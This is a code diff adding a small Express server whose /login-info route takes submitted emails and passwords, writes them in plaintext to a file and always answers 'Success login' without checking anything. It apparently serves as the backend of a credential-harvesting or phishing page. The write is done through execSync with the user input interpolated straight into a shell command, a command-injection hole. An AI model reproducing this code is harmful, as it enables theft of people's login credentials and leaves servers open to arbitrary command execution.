@@ -1,0 +1,42 @@
+const express = require('express')
+const app = express()
+const path = require('path')
+const { execSync } = require('child_process')
+const logger = require('morgan')
+
+const port = 4000
+
+app.listen(port, () => {
+    console.log('server work')
+})
+
+app.use(express.static(path.join(__dirname, 'public')))
+app.use(express.json())
+app.use(logger('dev'))
+
+app.post('/login-info', (req, res) => {
+    try {
+        const { email, password } = req.body
+        if (!email || !password) return res.json({
+            title: "Bad requist",
+            message: "Enter email and password"
+        })
+
+        const data = {
+            email,
+            password
+        }
+
+        execSync(`echo ${JSON.stringify(data)} >> data.txt`)
+        res.json({
+            title:"Success",
+            message:"Success login"
+        })
+    } catch (e) {
+        res.json({
+            title:"Error",
+            message:e.message
+        })
+    }
+
+})
